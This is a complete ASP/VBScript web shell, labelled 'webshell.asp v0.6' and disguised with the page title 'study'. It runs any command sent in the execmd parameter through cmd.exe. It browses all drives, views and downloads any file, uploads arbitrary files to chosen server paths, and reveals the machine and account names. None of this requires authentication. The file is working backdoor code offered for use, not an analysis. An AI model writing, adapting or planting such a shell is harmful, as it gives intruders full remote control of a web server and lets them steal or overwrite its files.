<%@ Language=VBScript %>
<%Option Explicit%>
<%
'V 1.0
'다운로드 버그 수정
%>

<% Response.Expires =  - 1 %>
<%

'colap@krpost.net
'webshell.asp v0.6

server.ScriptTimeout = 5400
On Error Resume Next

Dim wssh, wsnet, scfilesys, thesedrives
Dim progname, thisis, execmd, whatmode, upfilepath, upfile
Dim requestmethod

progname = Request.ServerVariables("PATH_INFO")
progname = Right(progname, Len(progname) - InStrRev(progname, "/"))

Set wssh = server.CreateObject("Wscript.Shell")
Set wsnet = server.CreateObject("Wscript.Network")
Set scfilesys = server.CreateObject("Scripting.FileSystemObject")

requestmethod = Request.ServerVariables("REQUEST_METHOD")

If requestmethod = "POST" Then

   Dim postform
   Set postform = New POST_FORM

     postform.Read
     whatmode = "upload"
     upfilepath = postform("upfilepath")
     thisis = upfilepath

ElseIf requestmethod = "GET" Then

   whatmode = Request("whatmode")
   execmd = Request("execmd")
   thisis = Trim(Request("thisis"))

Else
End If

' For Debugging
'Response.Write "requestmethod = " & requestmethod & "<br>"
'Response.Write "whatmode = " & whatmode & "<br>"
'Response.Write "execmd = " & execmd & "<br>"
'Response.Write "upfilepath = " & upfilepath & "<br>"
'Response.Write "thisis = " & thisis & "<br>"

Set thesedrives = scfilesys.Drives

If thisis = "" Then
   thisis = server.mapPath(".")
End If

If whatmode = "list" Then
   Call head_HTML
   Call List_Files
   Call tail_HTML
ElseIf whatmode = "view" Then
   Call head_HTML
   Call View_File(thisis)
   Call tail_HTML
ElseIf whatmode = "execute" Then
   Call head_HTML
   Call Run_Command
   Call tail_HTML
ElseIf whatmode = "upload" Then
   Call head_HTML
   Call Up_File
   Call tail_HTML
ElseIf whatmode = "download" Then
   Call Down_File
Else
   Call head_HTML
   Call List_Files
   Call tail_HTML
End If

Sub head_HTML()

   Dim uppath

   If whatmode = "view" Then
      uppath = Left(thisis, InStrRev(thisis, "\") - 1)
   Else
      uppath = thisis
   End If

   Response.Write "<html>"
   Response.Write "<head><title>study</title></head>"
   Response.Write "<body>"
   Response.Write "<font face='Fixedsys'>"
   Response.Write "<form name='stg' method='get' action='" & progname & "'>"
   Response.Write "study <br>"
   Response.Write "=====================<br>"
   Response.Write "ComputerName:<b> " & wsnet.ComputerName & "</b> UserName: <b>" & wsnet.UserName & "</b><br>"
   Response.Write "<input type='hidden' name='whatmode' value='execute'>"
   Response.Write "<input type='hidden' name='thisis' value='" & uppath & "'>"
   Response.Write "<input type='text' name='execmd' size='85' value=''>"
   Response.Write "<input type='submit' name='Submit' value='exec'>"
   Response.Write "</form>"
   Response.Write "<form name='stg' method='post' action='" & progname & "' enctype='multipart/form-data'>"
   Response.Write "UpPath:<input type='text' name='upfilepath' value='" & uppath & "' size='35'> "
   Response.Write "UpFile:<input type='file' name='upfile' size='15'>&nbsp;"
   Response.Write "<input type='submit' name='Submit' value='upload'>"
   Response.Write "</form>"

End Sub

Sub tail_HTML()

   Dim adrive, freespace, totalsize

   Response.Write "<br>"
   Response.Write "<table>"
   Response.Write "<tr><td><b>Name</b></td><td><b>Type</b></td><td><b>Size</b></td></tr>"

   For Each adrive In thesedrives

      Response.Write "<tr>"
      Response.Write "<td nowrap>"

      If adrive.IsReady = True Then
         Response.Write "<b>" & "<a href='" & progname & "?thisis=" & adrive.RootFolder & "&whatmode=list" & "'>" & adrive & "</a></b>"
      Else
         Response.Write "<b>" & adrive & "</a></b>"
      End If

      Response.Write "</td>"

      Response.Write "<td nowrap>"

      Select Case adrive.DriveType
         Case 0
            Response.Write "Unknown"
         Case 1
            Response.Write "Removable"
         Case 2
            Response.Write "Fixed"
         Case 3
            Response.Write "Remote"
         Case 4
            Response.Write "CDROM"
         Case 5
            Response.Write "RAMDisk"
         Case Else
            Response.Write "Unknown"
      End Select

      Response.Write "</td>"

      Response.Write "<td nowrap>"

      If adrive.IsReady = False Then
         Response.Write "NOT READY"
      Else
         freespace = Change_Bytes(adrive.freespace)
         totalsize = Change_Bytes(adrive.totalsize)
         Response.Write freespace & " free/" & totalsize & " total"
      End If

      Response.Write "</td>"
      Response.Write "</tr>"

   Next

   Response.Write "</table><br>"
   If Err.Number <> 0 Then
     Response.Write "Error<br>"
     Response.Write "Err.Description : " & Err.Description & "<br>"
     Response.Write "Err.Number : " & Err.Number & "<br>"
     Response.Write "Err.Source : " & Err.Source & "<br>"
     Response.Write "Err.HelpFile : " & Err.HelpFile & "<br>"
     Response.Write "Err.HelpContext : " & Err.HelpContext & "<br>"
   End If
   Response.Write "</font></body></html>"

End Sub

Sub List_Files()

   Dim mtime, parentmtime, thisfolder, afolder, afile, FileSize, fileext, listpath

   mtime = "Root"
   parentmtime = "Root"

   Set thisfolder = scfilesys.GetFolder(thisis)

   Response.Write "List: <b>" & thisis & " </b>"
   Response.Write "<br><br>"
   Response.Write "<table>"

   If thisfolder.IsRootFolder = False Then
      mtime = thisfolder.DateLastModified

      If thisfolder.ParentFolder.IsRootFolder = False Then
         parentmtime = thisfolder.ParentFolder.DateLastModified
      End If

      Response.Write "<tr>"
      Response.Write "<td nowrap>" & parentmtime & "</td>"
      Response.Write "<td nowrap>" & thisfolder.ParentFolder.Type & "</td>"
      Response.Write "<td nowrap>&nbsp;</td>"
      Response.Write "<td nowrap><b><a href='" & progname & "?thisis=" & thisfolder.ParentFolder & "&whatmode=list" & "'>\..</a></b></td>"
      Response.Write "</tr>"

   End If

   Response.Write "<tr>"
   Response.Write "<td nowrap><p>" & mtime & "</td>"
   Response.Write "<td nowrap>" & thisfolder.Type & "</td>"
   Response.Write "<td nowrap>&nbsp;</td>"
   Response.Write "<td nowrap><p><b>\.</b></td>"
   Response.Write "</tr>"

   For Each afolder In thisfolder.SubFolders

      thisis = afolder.Path

      Response.Write "<tr>"
      Response.Write "<td nowrap>" & afolder.DateLastModified & "</font></td>"
      Response.Write "<td nowrap>" & afolder.Type & "</td>"
      Response.Write "<td nowrap>&nbsp;</td>"
      Response.Write "<td nowrap><a href='" & progname & "?thisis=" & thisis & "&whatmode=list" & "'>\" & afolder.Name & "</a></b></td>"
      Response.Write "</tr>"

   Next

   For Each afile In thisfolder.Files

      thisis = afile.Path

      FileSize = Change_Bytes(afile.Size)

      If InStr(afile.Name, ".") > 0 Then
         fileext = LCase(Right(afile.Name, Len(afile.Name) - InStrRev(afile.Name, ".")))
      Else
         fileext = ""
      End If

      Response.Write "<tr>"
      Response.Write "<td nowrap>" & afile.DateLastModified & "</td>"
      Response.Write "<td nowrap>" & afile.Type & "</td>"
      Response.Write "<td nowrap>" & FileSize & "</td>"
      Response.Write "<td nowrap><a href='" & progname & "?thisis=" & thisis & "&whatmode=download'>ⓓ</a>&nbsp;<a href='" & progname & "?thisis=" & thisis & "&whatmode=view'>" & afile.Name & "</a></td>"
      Response.Write "</tr>"

   Next

   Response.Write "</table>"

End Sub

Sub Run_Command()

   Dim tempfile

   Response.Write "Execute: <b>" & execmd & " </b><a href='" & progname & "?thisis=" & thisis & "&whatmode=list'>LIST</a><br><br>"
   If ((execmd <> "") And (whatmode = "execute")) Then
      tempfile = "C:\" & scfilesys.GetTempName()
      Call wssh.Run("cmd.exe /c " & execmd & " > " & tempfile, 0, True)
      Call View_File(tempfile)
      Call scfilesys.DeleteFile(tempfile, True)
   End If
   Response.Write "<br>"

End Sub

Sub Up_File()

   postform.Files.Save thisis
   Response.Write "Upload: <b>Saved to " & thisis & " folder (" & postform.TotalBytes & "bytes)</b> <a href='" & progname & "?thisis=" & thisis & "&whatmode=list'>LIST</a><br>"

End Sub

Sub Down_File()

   Dim FileName
   Dim adbstream, filestring

   FileName = Right(thisis, Len(thisis) - InStrRev(thisis, "\"))

   Response.ContentType = "application/unknown"
   Response.AddHeader "Content-Disposition", "attachment; filename=" & FileName & ""
   Response.Charset="UTF-8"   

   Set adbstream = server.CreateObject("ADODB.Stream")
   adbstream.Open
   adbstream.Type = 1
   adbstream.LoadFromFile thisis

   filestring = adbstream.Read
   Set adbstream = Nothing

   Response.BinaryWrite filestring

End Sub

Sub View_File(sourcefile)

   Dim viewfile
   Dim viewfilesize
   Dim viewfilestring
   Dim listpath

   If whatmode = "view" Then
      listpath = Left(thisis, InStrRev(thisis, "\") - 1)
      Response.Write "View: <b>" & thisis & " </b><a href='" & progname & "?thisis=" & listpath & "&whatmode=list'>LIST</a>"
      Response.Write "<br><br>"
   End If

   Set viewfile = scfilesys.GetFile(sourcefile)

   viewfilesize = viewfile.Size

   If viewfilesize = 0 Then
      viewfilestring = ""
   Else
      Set viewfile = scfilesys.OpenTextFile(sourcefile, 1, False, 0)
      viewfilestring = viewfile.ReadAll
      viewfile.Close
   End If

   viewfilestring = Render_HTML(viewfilestring, True, True, True)

   If Trim(viewfilestring) = "" Then
      viewfilestring = "&nbsp;"
   End If

   Response.Write viewfilestring

End Sub

Function Render_HTML(sourcestring, tagencode, brencode, blankencode)

   Dim encodedstring

   encodedstring = sourcestring

   If tagencode = True Then
      encodedstring = server.HTMLEncode(encodedstring)
   End If

   If brencode = True Then
      encodedstring = Replace(encodedstring, Chr(13), Chr(13) & "<br>")
   End If

   If blankencode = True Then
      encodedstring = Replace(encodedstring, "  ", " &nbsp;")
   End If

   Render_HTML = encodedstring

End Function

Function Change_Bytes(numberbytes)

   Dim numberKB, numberMB, numberGB
   Dim numberstring

   numberKB = Fix(numberbytes / 10.24) / 100
   numberMB = Fix(numberKB / 10.24) / 100
   numberGB = Fix(numberMB / 10.24) / 100

   If numberKB < 1 Then
      numberstring = numberbytes & "bytes"
   ElseIf numberMB < 1 Then
      numberstring = numberKB & "KB"
   ElseIf numberGB < 1 Then
      numberstring = numberMB & "MB"
   Else
      numberstring = numberGB & "GB"
   End If

   Change_Bytes = numberstring

End Function

Class POST_FORM

    Public ChunkReadSize, BytesRead, TotalBytes
    Public TempPath, MaxMemoryStorage, CharSet, FormType, SourceData, ReadTimeout

    Public Default Property Get Item(Key)
        Set Item = m_Items.Item(Key)
    End Property

    Public Property Get Items()
'        Read
        Set Items = m_Items
    End Property

    Public Property Get Files()
'       Read
        Set Files = m_Items.Files
    End Property

    Public Property Get Texts()
'        Read
        Set Texts = m_Items.Texts
    End Property

    Private Function CheckRequestProperties()
      If UCase(Request.ServerVariables("REQUEST_METHOD")) <> "POST" Then 'Request method must be "POST"
            Exit Function
        End If

        Dim CT
        CT = Request.ServerVariables("HTTP_Content_Type")
        If Len(CT) = 0 Then CT = Request.ServerVariables("CONTENT_TYPE") 'reads Content-Type header UNIX/Linux
      If LCase(Left(CT, 19)) <> "multipart/form-data" Then 'Content-Type header must be "multipart/form-data"
            Exit Function
        End If 'If LCase(Left(CT, 19)) <> "multipart/form-data" Then

        Dim PosB 'help position variable
        PosB = InStr(LCase(CT), "boundary=") 'Finds boundary
        If PosB = 0 Then
            Exit Function
        End If 'If PosB = 0 Then
        If PosB > 0 Then Boundary = Mid(CT, PosB + 9)

        '****** Error of IE5.01 - doubbles http header
        PosB = InStr(LCase(CT), "boundary=")
        If PosB > 0 Then 'Patch for the IE error
            PosB = InStr(Boundary, ",")
            If PosB > 0 Then Boundary = Left(Boundary, PosB - 1)

        End If
        '****** Error of IE5.01 - doubbles http header

        On Error Resume Next
        TotalBytes = Request.TotalBytes
        If Err <> 0 Then
            TotalBytes = CLng(Request.ServerVariables("HTTP_Content_Length")) 'Get Content-Length header
            If Len(TotalBytes) = 0 Then TotalBytes = CLng(Request.ServerVariables("CONTENT_LENGTH")) 'Get Content-Length header
        End If

        If TotalBytes = 0 Then
            Exit Function
        End If
        CheckRequestProperties = True
    End Function

    Public Sub Read()

        If Not CheckRequestProperties Then
            Exit Sub
        End If
        If IsEmpty(bSourceData) Then Set bSourceData = CreateObject("ADODB.Stream")
        bSourceData.Open
        bSourceData.Type = 1 'Binary

        Dim DataPart, PartSize
        BytesRead = 0
        StartUploadTime = Now

        Do While BytesRead < TotalBytes
            PartSize = ChunkReadSize
            If PartSize + BytesRead > TotalBytes Then PartSize = TotalBytes - BytesRead
            DataPart = Request.BinaryRead(PartSize)
            BytesRead = BytesRead + PartSize

            bSourceData.Write DataPart

            If Not Response.IsClientConnected Then
                Exit Sub
            End If
        Loop
        ParseFormData
    End Sub

    Private Sub ParseFormData()
        Dim Binary
        bSourceData.Position = 0
        Binary = bSourceData.Read
        m_Items.mpSeparateFields Binary, Boundary
    End Sub
    Private Sub Class_Initialize()
        ChunkReadSize = &H10000 '64 kB
        BytesRead = 0
        TotalBytes = Request.TotalBytes
        Set m_Items = New cFormFields
    End Sub

    Public Boundary
    Private m_Items
    Private bSourceData 'ADODB.Stream
    Private StartUploadTime, TempFiolder

End Class

Class cFormFields
    Dim m_Keys()
    Dim m_Items()
    Dim m_Count

    Public Default Property Get Item(ByVal Key)
        If VarType(Key) = vbInteger Or VarType(Key) = vbLong Then
            'Numeric index
            If Key < 1 Or Key > m_Count Then Err.Raise "Index out of bounds"
            Set Item = m_Items(Key - 1)
            Exit Property
        End If
        Dim Count
        Count = ItemCount(Key)
        Key = LCase(Key)
        If Count > 0 Then
            If Count > 1 Then

                Dim OutItem, ItemCounter
                Set OutItem = New cFormFields
                ItemCounter = 0

                For ItemCounter = 0 To UBound(m_Keys)
                    If LCase(m_Keys(ItemCounter)) = Key Then OutItem.Add Key, m_Items(ItemCounter)
                Next
                Set Item = OutItem

            Else
                For ItemCounter = 0 To UBound(m_Keys)
                    If LCase(m_Keys(ItemCounter)) = Key Then Exit For
                Next

                If IsObject(m_Items(ItemCounter)) Then
                    Set Item = m_Items(ItemCounter)
                Else
                    Item = m_Items(ItemCounter)
                End If

            End If
        Else 'No item
            Set Item = New cFormField
        End If
    End Property

    Public Property Get MultiItem(ByVal Key)

        Dim Out: Set Out = New cFormFields
        Dim I, vItem
        Dim Count
        Count = ItemCount(Key)

        If Count = 1 Then
            'one key - get it from Item
            Out.Add Key, Item(Key)
        ElseIf Count > 1 Then
            'more keys - enumerate them using Items
            For Each I In Item(Key).Items
                Out.Add Key, I
            Next
        End If

        Set MultiItem = Out
    End Property

    Public Property Get Value()
        Dim I, V
        For Each I In m_Items
            V = V & ", " & I
        Next
        V = Mid(V, 3)
        Value = V
    End Property


    Public Property Get xA_NewEnum()
        Set xA_NewEnum = m_Items
    End Property

    Public Property Get Items()

        Items = m_Items
    End Property

    Public Property Get Keys()
        Keys = m_Keys
    End Property

    Public Property Get Files()
        Dim cItem, OutItem, ItemCounter
        Set OutItem = New cFormFields
        ItemCounter = 0
        If m_Count > 0 Then ' Enumerate only non-empty form
            For ItemCounter = 0 To UBound(m_Keys)
                Set cItem = m_Items(ItemCounter)
                If cItem.IsFile Then
                    OutItem.Add m_Keys(ItemCounter), m_Items(ItemCounter)
                End If
            Next
        End If
        Set Files = OutItem
    End Property

    Public Property Get Texts()
        Dim cItem, OutItem, ItemCounter
        Set OutItem = New cFormFields
        ItemCounter = 0

        For ItemCounter = 0 To UBound(m_Keys)
            Set cItem = m_Items(ItemCounter)
            If Not cItem.IsFile Then
                OutItem.Add m_Keys(ItemCounter), m_Items(ItemCounter)
            End If
        Next
        Set Texts = OutItem
    End Property

    Public Sub Save(Path)
        Dim Item
        For Each Item In m_Items
            If Item.IsFile Then
                Item.Save Path
            End If
        Next
    End Sub

    Public Property Get ItemCount(ByVal Key)
        'wscript.echo "ItemCount"
        Dim cKey, Counter
        Counter = 0
        Key = LCase(Key)
        For Each cKey In m_Keys
            'wscript.echo "ItemCount", "cKey"
            If LCase(cKey) = Key Then Counter = Counter + 1
        Next
        ItemCount = Counter
    End Property

    Public Property Get Count()
        Count = m_Count
    End Property

    Public Sub Add(ByVal Key, Item)
        Key = "" & Key
        ReDim Preserve m_Items(m_Count)
        ReDim Preserve m_Keys(m_Count)
        m_Keys(m_Count) = Key
        Set m_Items(m_Count) = Item
        m_Count = m_Count + 1
    End Sub

    Private Sub Class_Initialize()
        m_Count = 0
    End Sub

    Public Sub mpSeparateFields(Binary, ByVal Boundary)
        Dim PosOpenBoundary, PosCloseBoundary, PosEndOfHeader, isLastBoundary

        Boundary = "--" & Boundary
        Boundary = StringToBinary(Boundary)

        PosOpenBoundary = InStrB(Binary, Boundary)
        PosCloseBoundary = InStrB(PosOpenBoundary + LenB(Boundary), Binary, Boundary, 0)

        Do While (PosOpenBoundary > 0 And PosCloseBoundary > 0 And Not isLastBoundary)

            Dim HeaderContent, bFieldContent
            Dim Content_Disposition, FormFieldName, SourceFileName, Content_Type
            Dim TwoCharsAfterEndBoundary
            PosEndOfHeader = InStrB(PosOpenBoundary + Len(Boundary), Binary, StringToBinary(vbCrLf + vbCrLf))
            HeaderContent = MidB(Binary, PosOpenBoundary + LenB(Boundary) + 2, PosEndOfHeader - PosOpenBoundary - LenB(Boundary) - 2)
            bFieldContent = MidB(Binary, (PosEndOfHeader + 4), PosCloseBoundary - (PosEndOfHeader + 4) - 2)
            GetHeadFields BinaryToString(HeaderContent), FormFieldName, SourceFileName, Content_Disposition, Content_Type
            Dim Field        'All field values.
            Set Field = New cFormField

            Field.ByteArray = MultiByteToBinary(bFieldContent)

            Field.Name = FormFieldName
            Field.ContentDisposition = Content_Disposition
            If Not IsEmpty(SourceFileName) Then
                Field.FilePath = SourceFileName
                Field.FileName = GetFileName(SourceFileName)
            Else 'if not isempty(SourceFileName) then
            End If 'if not isempty(SourceFileName) then
            Field.ContentType = Content_Type

            Add FormFieldName, Field

            TwoCharsAfterEndBoundary = BinaryToString(MidB(Binary, PosCloseBoundary + LenB(Boundary), 2))
            isLastBoundary = TwoCharsAfterEndBoundary = "--"

            If Not isLastBoundary Then 'This is not last boundary - go to next form field.
                PosOpenBoundary = PosCloseBoundary
                PosCloseBoundary = InStrB(PosOpenBoundary + LenB(Boundary), Binary, Boundary)
            End If
        Loop
    End Sub
End Class 'cFormFields

Class cFormField

    Public ContentDisposition, ContentType, FileName, FilePath, Name
    Public ByteArray
    Public CharSet, HexString, SourceLength, RAWHeader, Index, ContentTransferEncoding
    Public Default Property Get String()
        'wscript.echo "**Field-String", Name, LenB(ByteArray)
        String = BinaryToString(ByteArray)
    End Property

    Public Property Get IsFile()
        IsFile = Not IsEmpty(FileName)
    End Property

    Public Property Get Length()
        Length = LenB(ByteArray)
    End Property

    Public Property Get Value()
        Set Value = Me
    End Property

    Public Sub Save(Path)
        If IsFile Then
            Dim fullFileName
            fullFileName = Path & "\" & FileName
            SaveAs fullFileName
        Else
            Err.Raise "Text field " & Name & " does not have a file name"
        End If
    End Sub

    Public Sub SaveAs(newFileName)
        If Len(ByteArray) > 0 Then SaveBinaryData newFileName, ByteArray
    End Sub

End Class


Function StringToBinary(String)
  Dim I, B
  For I=1 to len(String)
    B = B & ChrB(Asc(Mid(String,I,1)))
  Next
  StringToBinary = B
End Function

Function BinaryToString(Binary)
  Dim TempString
  On Error Resume Next
  TempString = RSBinaryToString(Binary)
  If Len(TempString) <> LenB(Binary) Then 'Conversion error
    TempString = MBBinaryToString(Binary)
  End If
  BinaryToString = TempString
End Function


Function MBBinaryToString(Binary)
  Dim cl1, cl2, cl3, pl1, pl2, pl3
  Dim L ', nullchar
  cl1 = 1
  cl2 = 1
  cl3 = 1
  L = LenB(Binary)

  Do While cl1 <= L
    pl3 = pl3 & Chr(AscB(MidB(Binary, cl1, 1)))
    cl1 = cl1 + 1
    cl3 = cl3 + 1
    If cl3 > 300 Then
      pl2 = pl2 & pl3
      pl3 = ""
      cl3 = 1
      cl2 = cl2 + 1
      If cl2 > 200 Then
        pl1 = pl1 & pl2
        pl2 = ""
        cl2 = 1
      End If
    End If
  Loop
  MBBinaryToString = pl1 & pl2 & pl3
End Function


Function RSBinaryToString(xBinary)
    Dim Binary
    If VarType(xBinary) = 8 Then Binary = MultiByteToBinary(xBinary) Else Binary = xBinary
  Dim RS, LBinary
  Const adLongVarChar = 201
  Set RS = CreateObject("ADODB.Recordset")
  LBinary = LenB(Binary)
    If LBinary > 0 Then
        RS.Fields.Append "mBinary", adLongVarChar, LBinary
        RS.Open
        RS.AddNew
            RS("mBinary").AppendChunk Binary
        RS.Update
        RSBinaryToString = RS("mBinary")
    Else
        RSBinaryToString = ""
    End If
End Function

Function MultiByteToBinary(MultiByte)
  Dim RS, LMultiByte, Binary
  Const adLongVarBinary = 205
  Set RS = CreateObject("ADODB.Recordset")
  LMultiByte = LenB(MultiByte)
    If LMultiByte > 0 Then
        RS.Fields.Append "mBinary", adLongVarBinary, LMultiByte
        RS.Open
        RS.AddNew
            RS("mBinary").AppendChunk MultiByte & ChrB(0)
        RS.Update
        Binary = RS("mBinary").GetChunk(LMultiByte)
    End If
  MultiByteToBinary = Binary
End Function

Function GetHeadFields(ByVal Head, Name, FileName, Content_Disposition, Content_Type)
  Name = (SeparateField(Head, "name=", ";")) 'ltrim
  If Left(Name, 1) = """" Then Name = Mid(Name, 2, Len(Name) - 2)
  FileName = (SeparateField(Head, "filename=", ";")) 'ltrim
  If Left(FileName, 1) = """" Then FileName = Mid(FileName, 2, Len(FileName) - 2)
  Content_Disposition = LTrim(SeparateField(Head, "content-disposition:", ";"))
  Content_Type = LTrim(SeparateField(Head, "content-type:", ";"))
End Function

Function SeparateField(From, ByVal sStart, ByVal sEnd)
  Dim PosB, PosE, sFrom
  sFrom = LCase(From)
  PosB = InStr(sFrom, sStart)
  If PosB > 0 Then
    PosB = PosB + Len(sStart)
    PosE = InStr(PosB, sFrom, sEnd)
    If PosE = 0 Then PosE = InStr(PosB, sFrom, vbCrLf)
    If PosE = 0 Then PosE = Len(sFrom) + 1
    SeparateField = Mid(From, PosB, PosE - PosB)
  Else
    SeparateField = Empty
  End If
End Function

Function SplitFileName(FullPath)
  Dim Pos, PosF
  PosF = 0
  For Pos = Len(FullPath) To 1 Step -1
    Select Case Mid(FullPath, Pos, 1)
      Case ":", "/", "\": PosF = Pos + 1: Pos = 0
    End Select
  Next
  If PosF = 0 Then PosF = 1
    SplitFileName = PosF
End Function

Function GetPath(FullPath)
  GetPath = Left(FullPath, SplitFileName(FullPath) - 1)
End Function

Function GetFileName(FullPath)
  GetFileName = Mid(FullPath, SplitFileName(FullPath))
End Function

Function RecurseMKDir(ByVal Path)
  Dim FS: Set FS = CreateObject("Scripting.FileSystemObject")
  Path = Replace(Path, "/", "\")
  If Right(Path, 1) <> "\" Then Path = Path & "\"   '"
  Dim Pos, n
  Pos = 0: n = 0
  Pos = InStr(Pos + 1, Path, "\")   '"
  Do While Pos > 0
    On Error Resume Next
    FS.CreateFolder Left(Path, Pos - 1)
    If Err = 0 Then n = n + 1
    Pos = InStr(Pos + 1, Path, "\")   '"
  Loop
  RecurseMKDir = n
End Function

Function SaveBinaryData(FileName, ByteArray)
    SaveBinaryData = SaveBinaryDataStream(FileName, ByteArray)
End Function

Function SaveBinaryDataTextStream(FileName, ByteArray)
  Dim FS: Set FS = CreateObject("Scripting.FileSystemObject")
    On Error Resume Next
  Dim TextStream
    Set TextStream = FS.CreateTextFile(FileName)
    If Err = &H4C Then 'Path not found.
        On Error GoTo 0
        RecurseMKDir GetPath(FileName)
        On Error Resume Next
        Set TextStream = FS.CreateTextFile(FileName)
    End If
  TextStream.Write BinaryToString(ByteArray) 'BinaryToString is in upload.inc.
  TextStream.Close
    Dim ErrMessage, ErrNumber
    ErrMessage = Err.Description
    ErrNumber = Err

    On Error GoTo 0
    If ErrNumber <> 0 Then Err.Raise ErrNumber, "SaveBinaryData", FileName & ":" & ErrMessage

End Function

Function SaveBinaryDataStream(FileName, ByteArray)
    Dim BinaryStream
    Set BinaryStream = CreateObject("ADODB.Stream")
    BinaryStream.Type = 1 'Binary
    BinaryStream.Open
    BinaryStream.Write ByteArray
    On Error Resume Next
    BinaryStream.SaveToFile FileName, 2 'Overwrite
    If Err = &HBBC Then 'Path not found.
        On Error GoTo 0
        RecurseMKDir GetPath(FileName)
        On Error Resume Next
        BinaryStream.SaveToFile FileName, 2 'Overwrite
    End If
    Dim ErrMessage, ErrNumber
    ErrMessage = Err.Description
    ErrNumber = Err
    On Error GoTo 0
    If ErrNumber <> 0 Then Err.Raise ErrNumber, "SaveBinaryData", FileName & ":" & ErrMessage
End Function

Class cResponse
    Public Property Get IsClientConnected()
        Randomize
        IsClientConnected = CBool(CLng(Rnd * 4))
        IsClientConnected = True
    End Property
End Class


Class cRequest

    Private Readed
    Private BinaryStream
    Public Function ServerVariables(Name)
        Select Case UCase(Name)
            Case "CONTENT_TYPE":
            Case "HTTP_CONTENT_TYPE":
                ServerVariables = "multipart/form-data; boundary=---------------------------7d21960404e2"
            Case "CONTENT_LENGTH":
            Case "HTTP_CONTENT_LENGTH":
                ServerVariables = "" & TotalBytes
            Case "REQUEST_METHOD":
                ServerVariables = "POST"
        End Select
    End Function

    Public Function BinaryRead(ByRef Bytes)
        If Bytes <= 0 Then Exit Function

        If Readed + Bytes > TotalBytes Then Bytes = TotalBytes - Readed
        BinaryRead = BinaryStream.Read(Bytes)
    End Function

    Public Property Get TotalBytes()
        TotalBytes = BinaryStream.Size
    End Property

    Private Sub Class_Initialize()
        Set BinaryStream = CreateObject("ADODB.Stream")
        BinaryStream.Type = 1 'Binary
        BinaryStream.Open
        BinaryStream.LoadFromFile ""
        BinaryStream.Position = 0
        Readed = 0
    End Sub
end Class

%>



